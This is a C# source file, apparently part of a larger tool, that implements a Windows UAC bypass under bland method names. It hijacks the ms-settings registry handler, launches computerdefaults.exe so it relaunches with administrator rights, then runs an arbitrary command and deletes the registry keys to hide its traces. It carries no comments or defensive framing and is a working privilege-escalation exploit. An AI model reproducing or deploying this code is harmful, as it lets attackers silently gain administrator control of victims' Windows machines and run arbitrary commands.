﻿using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

namespace UX
{
    internal class ClientStandalone
    {
        public static void ux()
        {
            try
            {
                if (!ClientAPI())
                {
                    ClientBridge();
                }
                else
                {
                    Process.Start("cmd.exe", $"/c start \"UxUAC [HEHE-BAY]\" \"cmd.exe\" \"{Program.command}");
                    RegistryKey ShellParentPath = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings", true);
                    ShellParentPath.DeleteSubKeyTree("shell", false);
                    ShellParentPath.Close();
                }
            }
            catch { }
        }
         static void ClientBridge()
        {
            if (!ClientAPI())
            {
                foreach (var Path in new[] { "Classes", @"Classes\ms-settings", @"Classes\ms-settings\shell", @"Classes\ms-settings\shell\open" })
                    ClientOpening(Path);
                
                try
                {
                    var DelegatePath = ClientOpening(@"Classes\ms-settings\shell\open\command");
                    DelegatePath.SetValue("", Process.GetCurrentProcess().MainModule.FileName, RegistryValueKind.String);
                    DelegatePath.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                    DelegatePath.Close();

                    Process.Start(new ProcessStartInfo()
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true,
                        FileName = "cmd.exe",
                        Arguments = "/c @start computerdefaults.exe"
                    });
                }
                catch { };
            }
            else
            {
                ClientOpening(@"Classes\ms-settings\shell\open\command").SetValue(null, null, RegistryValueKind.String);
            }
        }

        static bool ClientAPI()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        static RegistryKey ClientOpening(string RegPath)
        {
            RegistryKey FRegPath = Registry.CurrentUser.OpenSubKey($@"Software\{RegPath}", true);
            return FRegPath is null ? Registry.CurrentUser.CreateSubKey($@"Software\{RegPath}", true) : FRegPath;
        }
    }
}
